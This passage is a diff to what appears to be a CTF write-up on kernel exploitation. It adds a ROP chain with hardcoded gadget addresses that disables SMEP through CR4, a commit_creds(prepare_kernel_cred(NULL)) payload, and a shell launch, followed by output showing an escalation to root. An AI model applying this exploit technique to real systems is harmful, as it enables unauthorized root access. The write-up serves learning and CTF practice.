@@ -764,9 +764,159 @@ and such to disable smep:
     *stack++ = 0x4141414141414141;
 ```
 
-To disable smep we had to disable smep flag in CR4 register (20th bit).
+To disable smep we had to disable 20th bit of CR4 register.
 
-Now we can jump to assembly 
+Now we can jump to assembly our wrapper. We do this instead of directly invoking userland function as we want to avoid functions prologue and epilogue:
+
+```c
+#define JMP_RCX ((uint64_t)0xffffffff81047fb0)
+#define POP_RCX ((uint64_t)0xffffffff8100700c)
+
+#define JMP_TO(addr)           \
+    *stack++ = POP_RCX;        \
+    *stack++ = (uint64_t)addr; \
+    *stack++ = JMP_RCX;
+```
+
+Our final rop chain looks like:
+
+```c
+#define MOV_ESP_ECX ((uint64_t)0xffffffff8101dd39)
+#define MOV_CR4_RDI ((uint64_t)0xffffffff81004d80)
+#define MOV_RAX_CR4 ((uint64_t)0xffffffff81004c14)
+#define POP_RSI ((uint64_t)0xffffffff812c6c4e)
+#define AND_RAX_RSI ((uint64_t)0xffffffff815df7f6)
+#define MOV_RDI_RAX ((uint64_t)0xffffffff8133b32e)
+#define JMP_RCX ((uint64_t)0xffffffff81047fb0)
+#define POP_RCX ((uint64_t)0xffffffff8100700c)
+#define MOV_DWORDPTR_RCX_EAX ((uint64_t)0xffffffff81004d05)
+#define XCHG_RBP_RAX ((uint64_t)0xffffffff81446980)
+#define SHR_RAX_32 ((uint64_t)0xffffffff81216ede)
+
+#define STORE_EAX(addr)        \
+    *stack++ = POP_RCX;        \
+    *stack++ = (uint64_t)addr; \
+    *stack++ = MOV_DWORDPTR_RCX_EAX;
+
+#define SAVE_RBP(addr_hi, addr_lo) \
+    *stack++ = XCHG_RBP_RAX;       \
+    STORE_EAX(addr_lo);            \
+    *stack++ = SHR_RAX_32;         \
+    STORE_EAX(addr_hi);
+
+#define DISABLE_SMEP()             \
+    *stack++ = MOV_RAX_CR4;        \
+    *stack++ = 0x4141414141414141; \
+    *stack++ = POP_RSI;            \
+    *stack++ = SMEP_MASK;          \
+    *stack++ = AND_RAX_RSI;        \
+    *stack++ = 0x4141414141414141; \
+    *stack++ = MOV_RDI_RAX;        \
+    *stack++ = 0x4141414141414141; \
+    *stack++ = 0x4141414141414141; \
+    *stack++ = MOV_CR4_RDI;        \
+    *stack++ = 0x4141414141414141;
+
+#define JMP_TO(addr)           \
+    *stack++ = POP_RCX;        \
+    *stack++ = (uint64_t)addr; \
+    *stack++ = JMP_RCX;
+
+
+void build_rop_chain(uint64_t *stack)
+{
+    memset(stack, 0x0, PAGE_SIZE);
+
+    SAVE_RBP(&g_saved_rbp_hi, &g_saved_rbp_lo);
+    DISABLE_SMEP();
+    JMP_TO(&userland_entry);
+}
+```
+
+And userland_entry must first restore the saved rbp & rsp and then we can invoke userland function in which we do ` commit_creds(prepare_kernel_cred(NULL));`. Thats all? 
+
+```c
+#define COMMIT_CREDS ((void *)0xffffffff810a1420)
+#define PREPARE_KERNEL_CRED ((void *)0xffffffff810a1810)
+
+#define commit_creds(cred) \
+    (((commit_creds_func)(COMMIT_CREDS))(cred))
+
+#define prepare_kernel_cred(daemon) \
+    (((prepare_kernel_creds_func)(PREPARE_KERNEL_CRED))(daemon))
+
+static void payload(void)
+{
+    commit_creds(prepare_kernel_cred(NULL));
+}
+
+extern void userland_entry(void); /* make gcc happy */
+
+static __attribute__((unused)) void wrapper(void)
+{
+    /* avoid prolog */
+    __asm__ volatile("userland_entry:" ::);
+
+    /* restore saved rbp & rsp */
+    g_restored_rbp = ((g_saved_rbp_hi << 32) | g_saved_rbp_lo);
+    g_restored_rsp = ((g_saved_rbp_hi << 32) | (g_saved_rbp_lo - RSP_RBP_OFST));
+
+    __asm__ volatile("movq %0, %%rax\n"
+                     "movq %%rax, %%rbp\n" ::"m"(g_restored_rbp));
+
+    __asm__ volatile("movq %0, %%rax\n"
+                     "movq %%rax, %%rsp\n" ::"m"(g_restored_rsp));
+
+    /* escalate current process via commit_creds */
+    uint64_t ptr = (uint64_t)&payload;
+    __asm__ volatile("movq %0, %%rax\n"
+                     "call *%%rax\n" ::"m"(ptr));
+
+    /* make ioctl return some value */
+    __asm__ volatile("movq $5555, %%rax\n" ::);
+
+    /* avoid epilogue especially `leave` instruction */
+    __asm__ volatile("ret" ::);
+}
+```
+
+No, we just have to pop a shell!
+
+```c
+int main() 
+{
+    [...]
+    if (escalate(fd) < 0) {
+        fprintf(stderr, "[-] Failed to escalate\n");
+        goto fail;
+    }
+    printf("[+] Escalation phase succeed.\n");
+
+    printf("[i] Poping shell...");
+    system("/bin/sh");
+}
+```
+
+
+You can check the final exploit [here](exploit.c)
+
+```console
+/ $ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+/ $ ./exploit
+[i] g_fake_tty_operations: 0x120000000
+[i] g_fake_stack: 0x20000000
+[    7.132764] device open
+[    7.133250] device open
+[    7.133713] alloc done
+[    7.134153] alloc done
+[+] Initialization succeed.
+[    7.135041] device release
+[+] Triggered use-after-free.
+[+] Escalation phase succeed.
+/ # id
+uid=0(root) gid=0(root)
+```
 
 ## References:
 - https://blog.csdn.net/lukuen/article/details/6935068
